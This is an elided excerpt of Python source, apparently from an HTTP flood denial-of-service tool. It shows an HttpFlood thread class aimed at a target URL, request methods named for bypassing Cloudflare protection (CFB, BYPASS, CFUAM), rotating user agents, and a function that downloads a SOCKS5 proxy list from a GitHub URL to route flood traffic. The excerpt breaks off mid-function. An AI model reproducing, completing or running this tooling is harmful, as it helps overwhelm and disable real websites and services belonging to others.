...
def Headers(method):
    ...
    elif method == "null" or method == "cfuam":
...
class HttpFlood(Thread):
    ...
    def __init__(self, target: URL, method: str = "GET", multiple: int = 1,
                 synevent: Event = None, useragent: Set[str] = None,
        ...
        self._useragents = list(useragent)
...
def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFUAM", "GETV2", "HTTPFASTV2", "HTTPFAST", "BYPASS",
                                            "BYPASSV2", "CFBV2", "POSTV2", "NULL"} \
            else "POST" if {method.upper()} & {"POST"} \
            else "HEAD" if {method.upper()} & {"CFB", "HEAD","NULLHEAD"} \
            else "REQUESTS"
...
def downloadsocks(choice):
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT1/FortniBloxYT1/main/socks5l.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
